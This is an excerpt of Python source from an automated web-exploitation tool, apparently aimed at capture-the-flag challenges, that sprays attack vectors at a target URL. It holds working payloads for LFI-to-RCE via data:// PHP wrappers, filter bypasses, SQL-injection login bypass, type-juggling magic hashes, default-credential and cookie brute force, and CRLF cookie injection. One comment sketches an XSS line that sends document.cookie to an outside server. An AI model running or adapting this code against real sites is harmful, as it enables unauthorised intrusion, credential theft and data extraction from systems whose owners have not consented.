        print_header("المرحلة 4: الاستغلال الفعلي", "Phase 4: Active Multi-Vector Exploitation")

        # ── Predictive prioritization ────────────────────────────────────
        # Run the exploit vectors that were predicted as most likely FIRST,
        # so the tool focuses effort on the highest-confidence attack surface.
        predictions = self.state.get("predictions", [])
        predicted_classes = {p["vuln_class"] for p in predictions}
        if predicted_classes:
            print_info(f"Prioritizing predicted vectors: {', '.join(sorted(predicted_classes))}")

        # Map vuln_class -> exploit method
        exploit_map = {
            "file_upload": self._exploit_file_upload,
            "ssti": self._exploit_ssti,
            "lfi": self._exploit_lfi,
            "cmd_injection": self._exploit_command_injection,
            "deserialization": self._exploit_deserialization,
            "nosql": self._exploit_nosql,
            "sqli": self._exploit_sqli,
            "jwt": self._exploit_jwt,
            "xss_to_admin": self._exploit_xss_to_admin,
            "php_tricks": self._exploit_php_tricks,
            "eval_injection": self._exploit_eval_injection,
            "cbc_bitflip": self._exploit_cbc_bitflip,
            "cookie_manipulation": self._exploit_cookie_brute_force,
            "cors": self._exploit_cors,
            "open_redirect": self._exploit_open_redirect,
            "hpp": self._exploit_hpp,
            "crlf": self._exploit_crlf,
            "csrf": self._exploit_csrf,
            "graphql": self._exploit_graphql,
            "ldap": self._exploit_ldap,
            "idor": self._exploit_idor,
            "race_condition": self._exploit_race_condition,
            "web_cache": self._exploit_web_cache,
            "smuggling": self._exploit_smuggling,
            "dom_clobbering": self._exploit_dom_clobbering,
            "mass_assignment": self._exploit_mass_assignment,
            "oauth": self._exploit_oauth,
            "csv_injection": self._exploit_csv_injection,
            "clickjacking": self._exploit_clickjacking,
            "dns_rebinding": self._exploit_dns_rebinding,
            "zip_slip": self._exploit_zip_slip,
            "tabnabbing": self._exploit_tabnabbing,
            "css_injection": self._exploit_css_injection,
            "ssi": self._exploit_ssi,
            "xslt": self._exploit_xslt,
            "xs_leak": self._exploit_xs_leak,
            "latex": self._exploit_latex,
        }

        # ── Intelligence-driven prioritization ───────────────────────────
        # Use the Intelligence Engine's attack priority to reorder the
        # exploit vectors so the tool attacks the MOST IMPORTANT targets first
        # and SKIPS the noise that the brain flagged as low-value.
        intelligence = getattr(self, "intelligence", None)
        attack_priority = self.state.get("attack_priority", [])
        ignore_list = self.state.get("ignore_list", [])

        # Build a set of endpoints to skip (noise)
        ignore_paths = {e["endpoint"] for e in ignore_list}

        # Build a priority map: vuln_class -> priority score
        priority_map = {}
        for item in attack_priority:
            vc = item.get("vuln_class", "")
            if vc in exploit_map:
                score = item.get("priority", 50)
                if vc not in priority_map or score > priority_map[vc]:
                    priority_map[vc] = score

        # Run predicted vectors first (highest confidence first)
        run_order = []
        for p in sorted(predictions, key=lambda x: x["confidence"], reverse=True):
            vc = p["vuln_class"]
            if vc in exploit_map and vc not in run_order:
                run_order.append(vc)
        # Then run intelligence-prioritized vectors
        for vc, score in sorted(priority_map.items(), key=lambda x: x[1], reverse=True):
            if vc not in run_order:
                run_order.append(vc)
        # Then run the remaining vectors in default order
        for vc in exploit_map:
            if vc not in run_order:
                run_order.append(vc)

        # Log the intelligence-driven ordering decision
        if priority_map:
            top_vc = max(priority_map, key=priority_map.get)
            print_info(f"Intelligence Engine prioritizes: [bold yellow]{top_vc}[/bold yellow] (score {priority_map[top_vc]}/100)")
            self._log_step(
                "Phase 4: Intelligence Prioritization",
                f"Prioritized {top_vc} exploit vector based on intelligence scoring",
                details=f"Priority score: {priority_map[top_vc]}/100"
            )

        # ── HUMAN-LIKE FOCUSED EXPLOITATION ──────────────────────────────
        # Like a human pentester: try a vector -> if it succeeds, DEEP-DIVE
        # into it. If the deep-dive doesn't yield a flag, fall back and try
        # the NEXT vector. Keep going until a flag is found or all vectors
        # are exhausted.
        total_flags_before = len(self.state.get("captured_flags", []))

        # 1. Fast-Track: If flag was already captured in Phase 3
        if total_flags_before > 0:
            print_success("[bold green]Flag already captured in Phase 3! Skipping blind exploitation spray.[/bold green]")
            return

        # 2. Fast-Track: If Reasoner confirmed a vulnerability (e.g. Auth Bypass)
        ctf_confirmed = self.state.get("ctf_confirmed", [])
        if ctf_confirmed:
            print_success("[bold yellow]Reasoner confirmed a vulnerability! Skipping blind payload spraying to pivot to authenticated surface.[/bold yellow]")
            for res in ctf_confirmed:
                if "exploit" in res:
                    print_info(f"  -> Confirmed: {res['exploit']}")
        
        # Always run these regardless of prediction (broad coverage)
        if not ctf_confirmed:
            for vc in run_order:
                # If we captured a new flag from a previous vector, we're done
                if len(self.state.get("captured_flags", [])) > total_flags_before:
                    print_success(f"[bold green]Flag captured via '{vc}'! Stopping further exploitation.[/bold green]")
                    break

                print_info(f"Trying exploit vector: [bold cyan]{vc}[/bold cyan]...")
                try:
                    exploit_map[vc]()
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    print_warning(f"Exploit vector '{vc}' failed: {e}")

                # ── DEEP-DIVE: If this vector established RCE, focus on it ──
                if self.state["active_rce_method"]:
                    print_success(f"[bold yellow]RCE established via '{vc}'! DEEP-DIVING into it...[/bold yellow]")
                    self._log_step(
                        "Phase 4: Deep-Dive",
                        f"RCE established via {vc} - focusing exploitation",
                        details="Deep-dive mode: reverse shell, priv-esc, flag hunting"
                    )
                    self._deep_dive_rce()

                    # ── FALLBACK: If deep-dive didn't find a flag, clear RCE
                    #    and continue trying OTHER vectors (human behavior) ──
                    if len(self.state.get("captured_flags", [])) == total_flags_before:
                        print_warning(f"[bold yellow]Deep-dive on '{vc}' yielded no flag. Falling back to other vectors...[/bold yellow]")
                        self.state["active_rce_method"] = None
                        self._log_step(
                            "Phase 4: Fallback",
                            f"Deep-dive on {vc} produced no flag - resuming other vectors",
                            details="Continuing exploitation across remaining vectors"
                        )
                    else:
                        # Found a flag via deep-dive - we're done
                        break

        # Always run these regardless of prediction (broad coverage)
        self._exploit_client_side_crypto()
        self._exploit_reasoning_driven()
        # Execute the multi-stage reasoning plan (complex challenges)
        self._exploit_reasoning_plan()
        # Execute CTF Logical Reasoner confirmed hypotheses (human-like)
        self._exploit_ctf_reasoner()
        # Feedback loop: feed exploitation results back into reasoning engine
        self._feed_exploitation_results_to_reasoning()


    def _exploit_ctf_reasoner(self):
        """
        Execute exploitation steps derived from the CTF Logical Reasoner.
        This is the HUMAN-LIKE exploitation path: the reasoner already
        analyzed the application's logic (cookies, headers, behavior) and
        formed testable hypotheses. Here we DEEP-DIVE into each confirmed
        hypothesis to extract the flag.
        """
        # Re-run reasoner because Phase 4 might have discovered new info (e.g. leaked source files)
        try:
            print_info("Re-running CTF Reasoner with updated state...")
            from modules.ctf_reasoner import CTFReasoner
            ctf_reasoner = CTFReasoner(self.target_url, session=self.session, state=self.state)
            reasoner_report = ctf_reasoner.reason()
            self.state["ctf_observations"] = reasoner_report["observations"]
            self.state["ctf_hypotheses"] = reasoner_report["hypotheses"]
            self.state["ctf_test_results"] = reasoner_report["test_results"]
            self.state["ctf_confirmed"] = reasoner_report["confirmed"]
        except Exception as e:
            pass
        confirmed = self.state.get("ctf_confirmed", [])
        if not confirmed:
            # Even if nothing was confirmed, try the reasoner's hypotheses
            # that have high confidence - they may still be exploitable
            hypotheses = self.state.get("ctf_hypotheses", [])
            high_conf = [h for h in hypotheses if h.get("confidence", 0) >= 0.8]
            if not high_conf:
                print_info("CTF Reasoner: No high-confidence hypotheses to exploit.")
                return
            print_info(f"CTF Reasoner: Attempting {len(high_conf)} high-confidence hypotheses...")
            for h in high_conf:
                self._exploit_reasoner_hypothesis(h)
            return

        print_info(f"CTF Reasoner: Exploiting {len(confirmed)} confirmed hypotheses...")
        for c in confirmed:
            title = c.get("hypothesis", "")
            exploit = c.get("exploit", "")
            print_success(f"CTF Reasoner: Deep-diving into '{title}'")
            self._log_step(
                "Phase 4: CTF Reasoner Exploit",
                f"Exploiting confirmed hypothesis: {title}",
                details=exploit
            )

            # ── CBC Bit-Flip exploitation ──────────────────────────────
            if "CBC Bit-Flipping" in title:
                self._exploit_cbc_bitflip()

            # ── Plaintext JSON cookie ──────────────────────────────────
            elif "Plaintext JSON Cookie" in title:
                self._exploit_json_cookie()

            # ── JWT ────────────────────────────────────────────────────
            elif "JWT Token" in title:
                self._exploit_jwt()

            # ── Deserialization ────────────────────────────────────────
            elif "Deserialization" in title:
                self._exploit_deserialization()

            # ── Auth bypass ────────────────────────────────────────────
            elif "Authentication Bypass" in title:
                self._exploit_auth_bypass()

            # ── File upload ────────────────────────────────────────────
            elif "File Upload" in title:
                self._exploit_file_upload()

            # ── SSTI ───────────────────────────────────────────────────
            elif "SSTI" in title:
                self._exploit_ssti()

    def _exploit_reasoner_hypothesis(self, h: Dict):
        """Exploit a high-confidence hypothesis from the reasoner."""
        title = h.get("title", "")
        print_info(f"CTF Reasoner: Trying hypothesis '{title}'...")
        if "CBC Bit-Flipping" in title:
            self._exploit_cbc_bitflip()
        elif "Plaintext JSON Cookie" in title:
            self._exploit_json_cookie()
        elif "JWT Token" in title:
            self._exploit_jwt()
        elif "Authentication Bypass" in title:
            self._exploit_auth_bypass()
        elif "Cookie Manipulation" in title:
            self._exploit_cookie_brute_force()
        elif "SSTI" in title:
            self._exploit_ssti()
        elif "LFI Filter Bypass" in title:
            self._exploit_lfi_filter_bypass()
        elif "LFI to RCE via data" in title:
            self._exploit_lfi_to_rce_pivot()
        elif "XSS-to-Admin Pivot" in title:
            self._exploit_xss_to_admin_pivot()

    def _exploit_lfi_to_rce_pivot(self):
        """Try data:// and php://input wrappers to bypass LFI string filters via RCE"""
        print_info("Testing LFI to RCE pivot (data:// and php://input)...")
        payloads = [
            ("data://", "data://text/plain,<?php print_r(scandir('.')); ?>"),
            ("data://b64", "data://text/plain;base64,PD9waHAgcHJpbnRfcihzY2FuZGlyKCcuJykpOyA/Pg==")
        ]
        
        for name, p in payloads:
            try:
                r = self.session.get(self.target_url, params={"p": p}, timeout=8)
                if "index.php" in r.text or "config.php" in r.text or "services.php" in r.text:
                    print_success(f"[+] RCE Pivot ({name}) Successful! Directory listing found.")
                    self.state["active_rce_method"] = "LFI data wrapper"
                    # Try to cat config.php
                    cmd = "data://text/plain,<?php echo file_get_contents('config.php'); ?>"
                    r2 = self.session.get(self.target_url, params={"p": cmd}, timeout=8)
                    if "CONFIG" in r2.text or "<?php" in r2.text:
                        print_success("[+] Extracted config.php via RCE pivot!")
                        self._save_loot("config.php", r2.text)
                        self._save_flag(r2.text)
                    return
            except Exception as e:
                pass

    def _exploit_xss_to_admin_pivot(self):
        """Pivot to XSS if LFI/RCE is completely blocked"""
        print_info("Testing XSS-to-Admin pivot (Simulated)...")
        # In a real scenario, this would post a blind XSS payload to the report form
        print_warning("[-] Simulated: Report endpoint found, but we need the exact path to inject XSS.")
        # If we had the report URL, we would do:
        # self.session.post("http://webcompany.hax.w3challs.com/report.php", data={"url": "http://our-server/?cookie=\"+document.cookie+"\""})
        pass

    def _exploit_lfi_filter_bypass(self):
        """
        Deep reasoner execution for LFI WAF bypass.
        Tries advanced bypasses to read 'config' or 'index' when the WAF blocks the strings.
        """
        print_info("Executing advanced LFI WAF bypasses for 'config' / 'index'...")
        bypasses = [
            ("Mixed Case", "CoNfIg"),
            ("URL Encode", "%63onfig"),
            ("Double URL Encode", "%2563onfig"),
            ("Path Traversal", "../config"),
            ("Path Traversal 2", "....//config"),
            ("Path Traversal 3", "config/."),
            ("Null Byte", "config%00"),
            ("PHP Filter Base64", "php://filter/read=convert.base64-encode/resource=config"),
            ("PHP Filter Mixed Case", "php://filter/read=convert.base64-encode/resource=CoNfIg"),
            ("PHP Filter Base64 Double URL", "php://filter/read=convert.base64-encode/resource=%2563onfig")
        ]
        
        # Test GET param bypasses
        for name, payload in bypasses:
            try:
                r = self.session.get(self.target_url, params={"p": payload}, timeout=8)
                if "base64" in payload:
                    import re, base64
                    b64s = re.findall(r'[A-Za-z0-9+/=]{40,}', r.text)
                    for b in b64s:
                        try:
                            dec = base64.b64decode(b).decode('utf-8')
                            if '<?php' in dec or 'CONFIG' in dec or 'flag' in dec.lower():
                                print_success(f"[+] LFI Bypass ({name}) Successful! Extracted: {dec[:100]}...")
                                self._save_loot("config.php", dec)
                                self._save_flag(dec)
                                return
                        except Exception:
                            pass
            except Exception:
                pass
                
        # Test HTTP Parameter Pollution (HPP)
        try:
            print_info("Testing HTTP Parameter Pollution (HPP) for LFI bypass...")
            r = self.session.get(self.target_url + "?p=services&p=php://filter/read=convert.base64-encode/resource=config", timeout=8)
            import re, base64
            b64s = re.findall(r'[A-Za-z0-9+/=]{40,}', r.text)
            for b in b64s:
                try:
                    dec = base64.b64decode(b).decode('utf-8')
                    if '<?php' in dec or 'CONFIG' in dec:
                        print_success(f"[+] LFI Bypass (HPP) Successful!")
                        self._save_loot("config.php", dec)
                        self._save_flag(dec)
                        return
                except Exception:
                    pass
        except Exception:
            pass

        # Test POST bypass (if WAF only inspects GET)
        try:
            print_info("Testing POST bypass for LFI...")
            r = self.session.post(self.target_url, data={"p": "php://filter/read=convert.base64-encode/resource=config"}, timeout=8)
            import re, base64
            b64s = re.findall(r'[A-Za-z0-9+/=]{40,}', r.text)
            for b in b64s:
                try:
                    dec = base64.b64decode(b).decode('utf-8')
                    if '<?php' in dec or 'CONFIG' in dec:
                        print_success(f"[+] LFI Bypass (POST) Successful!")
                        self._save_loot("config.php", dec)
                        self._save_flag(dec)
                        return
                except Exception:
                    pass
        except Exception:
            pass

    def _exploit_json_cookie(self):
        """
        Exploit a plaintext JSON cookie by decoding, modifying, and re-encoding.
        This is the human approach: understand the cookie structure, modify
        the auth fields, and re-send.
        """
        print_info("Exploiting plaintext JSON cookie...")
        cookies = self.state.get("cookies", {})
        if not cookies:
            try:
                r = self.session.get(self.target_url, timeout=8)
                cookies = r.cookies.get_dict()
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                return

        for cname, cval in cookies.items():
            try:
                decoded = base64.b64decode(cval)
                json_data = json.loads(decoded.decode('utf-8'))
                if not isinstance(json_data, dict):
                    continue

                print_info(f"  Cookie '{cname}' JSON: {json_data}")

                # Try to set admin=true on all auth-related fields
                for key in list(json_data.keys()):
                    if any(k in key.lower() for k in ["admin", "role", "user", "auth", "is_", "privilege"]):
                        modified = dict(json_data)
                        modified[key] = True
                        new_cookie = base64.b64encode(json.dumps(modified).encode()).decode()
                        try:
                            r = self.session.get(self.target_url, cookies={cname: new_cookie}, timeout=15)
                            if self._check_and_store_flags(r.text, f"JSON cookie admin bypass ({key})"):
                                print_success(f"  Flag captured by setting '{key}'=true!")
                                return
                            # Also check for admin page access
                            if r.status_code == 200 and any(k in r.text.lower() for k in ["admin", "dashboard", "welcome"]):
                                print_success(f"  Admin access granted via '{key}'=true!")
                                self.state["admin_accessible"] = True
                                # Try to access admin pages
                                for path in ["/admin", "/flag", "/dashboard"]:
                                    try:
                                        ar = self.session.get(urljoin(self.target_url, path), cookies={cname: new_cookie}, timeout=15)
                                        self._check_and_store_flags(ar.text, f"Admin page {path}")
                                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                        pass
                        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                            continue
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                continue

    def _exploit_cookie_brute_force(self):
        """
        Exploit parametric cookies (like name, id, cookie, user_id)
        by brute-forcing numeric ranges and common role values.
        """
        print_info("Exploiting Cookie Manipulation & Brute-Force...")
        cookies = self.state.get("cookies", {})
        if not cookies:
            try:
                r = self.session.get(self.target_url, timeout=8)
                cookies = r.cookies.get_dict()
            except Exception:
                pass

        # Always include common parametric cookie names even if not discovered,
        # since picoCTF-style challenges often use a 'name' cookie set by JS.
        # We'll try the discovered cookies first, then fall back to common names.
        common_param_cookies = ["name", "id", "cookie", "user", "user_id", "page", "index", "num", "role"]
        cookie_names = list(cookies.keys())
        for c in common_param_cookies:
            if c not in cookie_names:
                cookie_names.append(c)

        # Define candidate values to brute-force
        # 1. Numeric values (common in IDs, page indices, cookie challenge indexes)
        numeric_candidates = [str(i) for i in range(-5, 100)]
        # 2. Common role/auth string candidates
        string_candidates = ["admin", "guest", "user", "anonymous", "root", "true", "false", "1", "0", "yes", "no"]
        candidates = numeric_candidates + string_candidates

        # We will scan endpoints we discovered, prioritising root and endpoints containing 'check' or 'cookie'
        endpoints_to_try = [self.target_url]
        for ep in self.state.get("endpoints", []):
            full_ep = urljoin(self.target_url, ep)
            if full_ep not in endpoints_to_try:
                endpoints_to_try.append(full_ep)
        # Always include /check if not already present (common picoCTF cookie challenge endpoint)
        check_ep = urljoin(self.target_url, "/check")
        if check_ep not in endpoints_to_try:
            endpoints_to_try.append(check_ep)

        # Priority sort: endpoints containing 'check', 'admin', 'cookie', or '/search'
        endpoints_to_try.sort(key=lambda x: any(k in x.lower() for k in ["check", "admin", "cookie", "search"]), reverse=True)

        for cname in cookie_names:
            # Only brute-force cookies that look like parameter properties, not Flask sessions or JWTs
            if any(k in cname.lower() for k in ["session", "csrf", "jwt", "token"]) and cname.lower() != "session":
                continue
            
            print_info(f"  Brute-forcing cookie '{cname}' against {len(endpoints_to_try)} endpoints...")
            
            for ep in endpoints_to_try:
                found_flag = False
                # Determine if this endpoint is a search/form endpoint (likely POST)
                is_post_endpoint = any(k in ep.lower() for k in ["search", "check", "query", "find", "lookup"])
                for val in candidates:
                    try:
                        # Try GET first
                        r = self.session.get(ep, cookies={cname: val}, timeout=5)
                        if self._check_and_store_flags(r.text, f"Cookie brute-force ({cname}={val}) against {ep}"):
                            print_success(f"  Flag captured by setting cookie '{cname}' to '{val}' on {ep}!")
                            found_flag = True
                            break
                        # If endpoint is search-like, also try POST with the cookie value as form data
                        if is_post_endpoint:
                            r = self.session.post(ep, data={cname: val}, cookies={cname: val}, timeout=5)
                            if self._check_and_store_flags(r.text, f"Cookie brute-force POST ({cname}={val}) against {ep}"):
                                print_success(f"  Flag captured by setting cookie '{cname}' to '{val}' on {ep} (POST)!")
                                found_flag = True
                                break
                    except Exception:
                        pass
                if found_flag:
                    return

    def _exploit_auth_bypass(self):
        """
        Exploit authentication bypass on login forms.
        Tries SQLi, type juggling, array injection, and default creds.
        """
        print_info("Exploiting authentication bypass...")
        forms = self.state.get("forms", [])
        for f in forms:
            action = f.get("action", self.target_url)
            method = f.get("method", "POST")
            inputs = [i.get("name", "") for i in f.get("inputs", [])]
            username_field = next((i for i in inputs if i in ["username", "email", "user"]), None)
            password_field = next((i for i in inputs if "pass" in i.lower()), None)
            if not username_field or not password_field:
                continue

            # SQLi auth bypass payloads
            sqli_payloads = [
                {"username": "' OR '1'='1' -- ", "password": "x"},
                {"username": "admin' -- ", "password": "x"},
                {"username": "' OR 1=1#", "password": "x"},
                {"username": "admin", "password": "' OR '1'='1"},
                {"username": "' OR '1'='1'#", "password": "x"},
                {"username": "admin' OR '1'='1", "password": "x"},
            ]
            for p in sqli_payloads:
                data = {**{i: "" for i in inputs}, **p}
                try:
                    if method.upper() == "POST":
                        r = self.session.post(action, data=data, timeout=15)
                    else:
                        r = self.session.get(action, params=data, timeout=15)
                    if r.status_code in (301, 302) or any(
                        k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                    ):
                        print_success(f"  SQLi auth bypass with {p}")
                        self._check_and_store_flags(r.text, f"Auth bypass ({p})")
                        # Follow redirect
                        if r.status_code in (301, 302):
                            loc = r.headers.get("Location", "")
                            if loc:
                                try:
                                    r2 = self.session.get(urljoin(action, loc), timeout=15)
                                    self._check_and_store_flags(r2.text, f"Auth bypass redirect {loc}")
                                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                                    pass
                        # Follow hidden forms in response (multi-step auth: login -> hash -> admin)
                        self._follow_hidden_forms(r.text, action, f"Auth bypass ({p})")
                        return
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    continue

            # Type juggling (magic hashes)
            magic_hashes = ["0e462097431906509019562988736854", "240610708", "0e830400451993494058024219903391"]
            for mh in magic_hashes:
                data = {**{i: "" for i in inputs}, password_field: mh, username_field: "admin"}
                try:
                    if method.upper() == "POST":
                        r = self.session.post(action, data=data, timeout=15)
                    else:
                        r = self.session.get(action, params=data, timeout=15)
                    if r.status_code in (301, 302) or any(
                        k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                    ):
                        print_success(f"  Type juggling bypass with magic hash {mh}")
                        self._check_and_store_flags(r.text, f"Type juggling ({mh})")
                        if r.status_code in (301, 302):
                            loc = r.headers.get("Location", "")
                            if loc:
                                try:
                                    r2 = self.session.get(urljoin(action, loc), timeout=15)
                                    self._check_and_store_flags(r2.text, f"Type juggling redirect {loc}")
                                except Exception:
                                    pass
                        self._follow_hidden_forms(r.text, action, f"Type juggling ({mh})")
                        return
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    continue

            # Array injection
            data = {**{i: "" for i in inputs}, password_field: ["x"], username_field: "admin"}
            try:
                if method.upper() == "POST":
                    r = self.session.post(action, data=data, timeout=15)
                else:
                    r = self.session.get(action, params=data, timeout=15)
                if r.status_code in (301, 302) or any(
                    k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                ):
                    print_success("  Array injection bypass!")
                    self._check_and_store_flags(r.text, "Array injection")
                    if r.status_code in (301, 302):
                        loc = r.headers.get("Location", "")
                        if loc:
                            try:
                                r2 = self.session.get(urljoin(action, loc), timeout=15)
                                self._check_and_store_flags(r2.text, f"Array injection redirect {loc}")
                            except Exception:
                                pass
                    self._follow_hidden_forms(r.text, action, "Array injection")
                    return
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

            # Default creds
            default_creds = [
                ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
                ("admin", "admin123"), ("root", "root"), ("user", "user"),
                ("admin", "toor"), ("admin", "letmein"),
            ]
            for u, p in default_creds:
                data = {**{i: "" for i in inputs}, username_field: u, password_field: p}
                try:
                    if method.upper() == "POST":
                        r = self.session.post(action, data=data, timeout=15)
                    else:
                        r = self.session.get(action, params=data, timeout=15)
                    if r.status_code in (301, 302) or any(
                        k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                    ):
                        print_success(f"  Default creds worked: {u}:{p}")
                        self._check_and_store_flags(r.text, f"Default creds ({u}:{p})")
                        self._follow_hidden_forms(r.text, action, f"Default creds ({u}:{p})")
                        return
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    continue


    def _exploit_reasoning_driven(self):
        """
        Execute exploitation steps derived from the Deep Reasoning Engine.
        Handles complex application-logic flaws that static payload lists miss:
        CRLF/Header injection, PHP type juggling, array injection, cookie manipulation.
        """
        print_info("Executing Deep Reasoning-Driven Exploitation (complex logic flaws)...")

        # 1. Re-run logic audit to get fresh active findings
        try:
            reasoning = ReasoningEngine(self.target_url, session=self.session, state=self.state)
            logic_findings = reasoning.audit_application_logic()
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            print_warning(f"Reasoning logic audit failed: {e}")
            return

        if not logic_findings:
            print_info("No additional complex logic flaws confirmed by reasoning engine.")
            return

        for finding in logic_findings:
            vc = finding["vuln_class"]
            print_success(f"Reasoning Engine Confirmed: [bold yellow]{finding['title']}[/bold yellow]")
            self._log_step(
                "Phase 4: Deep Reasoning Exploit",
                f"Exploited {vc}: {finding['title']}",
                details=finding.get("evidence", ""),
                curl_cmd=f"curl -s '{self.target_url}?{finding.get('param','')}={finding.get('payload','')}'"
            )

            # ── CRLF / Header Injection Exploitation ──────────────────────
            if vc == "crlf_injection":
                param = finding.get("param", "lang")
                # Build clean base URL (strip query string)
                from urllib.parse import urlparse
                _p = urlparse(self.target_url)
                base_url = f"{_p.scheme}://{_p.netloc}{_p.path}"
                # Attempt Set-Cookie admin escalation
                admin_cookie_payload = f"fr%0d%0aSet-Cookie:%20admin=1%3b%20Path%3d/"
                try:
                    r = self.session.get(
                        f"{base_url}?{param}={admin_cookie_payload}",
                        allow_redirects=False,
                        timeout=15
                    )
                    # Check if admin cookie was set
                    resp_cookies = r.cookies.get_dict()
                    if "admin" in resp_cookies or "admin" in str(r.headers.get("Set-Cookie", "")):
                        print_success("CRLF injection set 'admin' cookie! Attempting privileged access...")
                        self._log_step(
                            "Phase 4: Deep Reasoning Exploit",
                            "CRLF Set-Cookie injection set admin cookie",
                            details=f"Param: {param} | Cookie: admin=1"
                        )
                        # Now request protected pages with the forged cookie
                        for protected in ["/admin", "/dashboard", "/profile", "/flag", "/admin.php"]:
                            try:
                                pr = self.session.get(urljoin(base_url, protected), timeout=15)
                                self._check_and_store_flags(pr.text, f"Protected page {protected} (via CRLF admin cookie)")
                            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                pass
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

            # ── Type Juggling / Array Injection ───────────────────────────
            elif vc == "type_juggling":
                # The finding already contains the successful payload; re-request
                # and check for flag in the authenticated response.
                param = finding.get("param", "password")
                payload = finding.get("payload", "0e462097431906509019562988736854")
                try:
                    # Determine form action from state
                    action = self.target_url
                    for form in self.state.get("forms", []):
                        if any("pass" in i.get("name", "").lower() for i in form.get("inputs", [])):
                            action = form.get("action", self.target_url)
                            break
                    if "[]" in payload:
                        # Array injection
                        data = {param: ["x"]}
                        r = self.session.post(action, data=data, timeout=15)
                    else:
                        # Magic hash
                        data = {param: payload, "username": "admin", "user": "admin", "login": "admin"}
                        r = self.session.post(action, data=data, timeout=15)
                    self._check_and_store_flags(r.text, f"Type juggling bypass on {action}")
                    # Follow redirects to authenticated area
                    if r.status_code in [301, 302]:
                        loc = r.headers.get("Location", "")
                        if loc:
                            try:
                                r2 = self.session.get(urljoin(action, loc), timeout=15)
                                self._check_and_store_flags(r2.text, f"Authenticated page after type juggling: {loc}")
                            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                pass
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass


    def _exploit_reasoning_plan(self):
        """
        Execute the multi-step attack plan produced by the Deep Reasoning Engine.
        Handles COMPLEX multi-stage challenges by walking the dependency chain:
        prerequisite -> exploit -> escalate -> capture. Each step's success feeds
        the next step, and results are fed back into the reasoning engine for
        adaptive re-planning.
        """
        plan = self.state.get("reasoning_plan", [])
        if not plan:
            print_info("No multi-step reasoning plan available to execute.")
            return

        print_info("Executing Deep Reasoning Multi-Stage Attack Plan...")
        executed = {}  # step_num -> success bool
        chain_results = {}  # chain_name -> list of step results

        # Execute steps in dependency order (topological sort by depends_on)
        remaining = list(plan)
        progress = True
        while remaining and progress:
            progress = False
            for step in list(remaining):
                deps = step.get("depends_on", [])
                # A step is ready when all its dependencies have been attempted
                if all(d in executed for d in deps):
                    remaining.remove(step)
                    success = self._execute_reasoning_step(step, executed, chain_results)
                    executed[step["step"]] = success
                    progress = True

        # ── Feedback loop: feed chain results back into reasoning state ──
        if chain_results:
            self.state["reasoning_chain_results"] = chain_results
            completed = {name: res for name, res in chain_results.items() if any(r for r in res)}
            if completed:
                print_success(f"Multi-stage chains with progress: {', '.join(completed.keys())}")
                self._log_step(
                    "Phase 4: Reasoning Plan",
                    f"Multi-stage chains progressed: {', '.join(completed.keys())}",
                    details="; ".join(f"{k}: {sum(1 for r in v if r)}/{len(v)} steps" for k, v in completed.items())
                )

    def _feed_exploitation_results_to_reasoning(self):
        """
        Feedback loop: collect Phase 4 exploitation results (successes, failures,
        captured flags, RCE availability) and feed them back into the reasoning
        engine so it can adaptively re-plan for complex multi-stage challenges.
        """
        results = {
            "captured_flags": list(self.state.get("captured_flags", [])),
            "active_rce_method": bool(self.state.get("active_rce_method")),
            "leaked_secrets": dict(self.state.get("leaked_secrets", {})),
            "admin_accessible": bool(self.state.get("admin_accessible")),
            "admin_bot_triggered": bool(self.state.get("admin_bot_triggered")),
            "xss_payload_submitted": bool(self.state.get("xss_payload_submitted")),
            "chain_results": self.state.get("reasoning_chain_results", {}),
            "predictions": self.state.get("predictions", []),
        }
        self.state["exploitation_feedback"] = results

        # If we have RCE, feed it into the reasoning engine for deeper analysis
        if self.state.get("active_rce_method"):
            print_info("Feeding RCE capability back into reasoning engine for deeper exploitation...")
            try:
                reasoning = ReasoningEngine(self.target_url, session=self.session, state=self.state)
                # Re-run reasoning with RCE context to find post-exploitation chains
                reasoning_report = reasoning.run_full_reasoning()
                self.state["reasoning_hypotheses"] = reasoning_report["hypotheses"]
                self.state["reasoning_plan"] = reasoning_report["attack_plan"]
                self.state["reasoning_logic_findings"] = reasoning_report["logic_findings"]
                print_success("Reasoning engine re-planned with RCE context for post-exploitation chains.")
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                print_warning(f"Reasoning re-plan with RCE context failed: {e}")

    def _execute_reasoning_step(self, step, executed, chain_results):
        """
        Execute a single step of the multi-stage reasoning plan.
        Returns True if the step produced a meaningful result (flag, RCE, auth).
        """
        goal = step.get("goal", "")
        hypothesis = step.get("hypothesis", "")
        chain = step.get("chain", "")
